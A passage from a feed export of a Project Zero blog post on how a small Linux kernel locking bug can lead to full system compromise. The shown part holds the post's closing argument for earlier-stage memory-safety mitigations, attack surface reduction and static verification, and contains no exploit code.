href=\"https://googleprojectzero.blogspot.com/2020/07/the-core-of-apple-is-ppl-breaking-xnu.html\"&gt;(on iOS, using PPL) userspace code pages&lt;/a&gt;.&lt;/p&gt;\n&lt;p&gt;The problem I see with this approach is that a large portion of the things a kernel does are, in some way, critical to the correct functioning of the system and system security. MMU state management, task scheduling, memory allocation, &lt;a href=\"https://googleprojectzero.blogspot.com/2020/02/mitigations-are-attack-surface-too.html\"&gt;filesystems&lt;/a&gt;, page cache, IPC, ... - if any one of these parts of the kernel is corrupted sufficiently badly, an attacker will probably be able to gain access to all user data on the system, or use that corruption to feed bogus inputs into one of the subsystems whose own data structures are read-only.&lt;/p&gt;\n&lt;p&gt;In my view, instead of trying to split out the most critical parts of the kernel and run them in a context with higher privileges, it might be more productive to go in the opposite direction and try to approximate something like a proper microkernel: Split out drivers that don't strictly need to be in the kernel and run them in a lower-privileged context that interacts with the core kernel through proper APIs. Of course that's easier said than done! But Linux does already have APIs for safely accessing PCI devices (VFIO) and USB devices from userspace, although userspace drivers aren't exactly its main usecase.&lt;/p&gt;\n&lt;p&gt;(One might also consider making page tables read-only not because of their importance to system integrity, but because the structure of page table entries makes them nicer to work with in exploits that are constrained in what modifications they can make to memory. I dislike this approach because I think it has no clear conclusion and it is highly invasive regarding how data structures can be laid out.)&lt;/p&gt;\n&lt;h1&gt;Conclusion&lt;/h1&gt;\n&lt;p&gt;This was essentially a boring locking bug in some random kernel subsystem that, if it wasn't for memory unsafety, shouldn't really have much of a relevance to system security. I wrote a fairly straightforward, unexciting (and admittedly unreliable) exploit against this bug; and probably the biggest challenge I encountered when trying to exploit it on Debian was to properly understand how the SLUB allocator works.&lt;/p&gt;\n&lt;p&gt;My intent in describing the exploit stages, and how different mitigations might affect them, &lt;strong&gt;is to highlight that the further a memory corruption exploit progresses, the more options an attacker gains; and so as a general rule, the earlier an exploit is stopped, the more reliable the defense is. Therefore, even if defenses that stop an exploit at an earlier point have higher overhead, they might still be more useful&lt;/strong&gt;.&lt;/p&gt;\n&lt;p&gt;I think that the current situation of software security could be dramatically improved - in a world where a little bug in some random kernel subsystem can lead to a full system compromise, the kernel can't provide reliable security isolation. Security engineers should be able to focus on things like buggy permission checks and core memory management correctness, and not have to spend their time dealing with issues in code that ought to not have any relevance to system security.&lt;/p&gt;\n&lt;p&gt;In the short term, there are some band-aid mitigations that could be used to improve the situation - like heap partitioning or fine-grained UAF mitigation. These might come with some performance cost, and that might make them look unattractive; but I still think that they're a better place to invest development time than things like CFI, which attempts to protect against much later stages of exploitation.&lt;/p&gt;\n&lt;p&gt;In the long term, I think something has to change about the programming language - plain C is simply too error-prone. Maybe the answer is Rust; or maybe the answer is to introduce enough annotations to C (along the lines of &lt;a href=\"https://www.microsoft.com/en-us/research/project/checked-c/\"&gt;Microsoft's Checked C project&lt;/a&gt;, although as far as I can see they mostly focus on things like array bounds rather than temporal issues) to allow Rust-equivalent build-time verification of locking rules, object states, refcounting, void pointer casts, and so on. Or maybe another completely different memory-safe language will become popular in the end, neither C nor Rust?&lt;/p&gt;\n&lt;p&gt;My hope is that perhaps in the mid-term future, we could have a statically verified, high-performance core of kernel code working together with instrumented, runtime-verified, non-performance-critical legacy code, such that developers can make a tradeoff between investing time into backfilling correct annotations and run-time instrumentation slowdown without compromising on security either way.&lt;/p&gt;\n&lt;h1&gt;TL;DR&lt;/h1&gt;\n&lt;p&gt;&lt;strong&gt;memory corruption is a big problem because small bugs even outside security-related code can lead to a complete system compromise; and to address that, it is important that we:&lt;/strong&gt;&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;\n&lt;p&gt;in the short to medium term:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;strong&gt;design new memory safety mitigations&lt;/strong&gt;:\n&lt;ul&gt;\n&lt;li&gt;ideally, that can stop attacks at an early point where attackers don't have a lot of alternate options yet\n&lt;ul&gt;\n&lt;li&gt;maybe at the memory allocator level (i.e. SLUB)&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;that can't be broken using address tag leaks (or we try to prevent tag leaks, but that's really hard)&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;&lt;strong&gt;continue using attack surface reduction&lt;/strong&gt;\n&lt;ul&gt;\n&lt;li&gt;in particular seccomp&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;&lt;strong&gt;explicitly prevent untrusted code from gaining important attack primitives&lt;/strong&gt;\n&lt;ul&gt;\n&lt;li&gt;like FUSE, and potentially consider fine-grained scheduler control&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;in the long term:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;strong&gt;statically verify correctness of most performance-critical code&lt;/strong&gt;\n&lt;ul&gt;\n&lt;li&gt;this will require determining how to retrofit annotations for object state and locking onto legacy C code&lt;/li&gt;\n&lt;li&gt;consider designing runtime verification just for gaps in static verification&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/div&gt;"},"link":[{"@rel":"replies","@type":"application/atom+xml","@href":"https://googleprojectzero.blogspot.com/feeds/8464515825658328843/comments/default","@title":"Post Comments"},{"@rel":"replies","@type":"text/html","@href":"https://googleprojectzero.blogspot.com/2021/10/how-simple-linux-kernel-memory.html#comment-form","@title":"0 Comments"},{"@rel":"edit","@type":"application/atom+xml","@href":"https://www.blogger.com/feeds/4838136820032157985/posts/default/8464515825658328843"},{"@rel":"self","@type":"application/atom+xml","@href":"https://www.blogger.com/feeds/4838136820032157985/posts/default/8464515825658328843"},{"@rel":"alternate","@type":"text/html","@href":"https://googleprojectzero.blogspot.com/2021/10/how-simple-linux-kernel-memory.html","@title":" How a simple Linux kernel memory corruption bug can lead to complete system compromise"}],"author":{"name":"Ryan","uri":"http://www.blogger.com/profile/17011901605865574886","email":"noreply@blogger.com","gd:image":{"@rel":"http://schemas.google.com/g/2005#thumbnail","@width":"16","@height":"16","@src":"https://img1.blogblog.com/img/b16-rounded.gif"}},"thr:total":"0"}]}}</feed>
</Logs>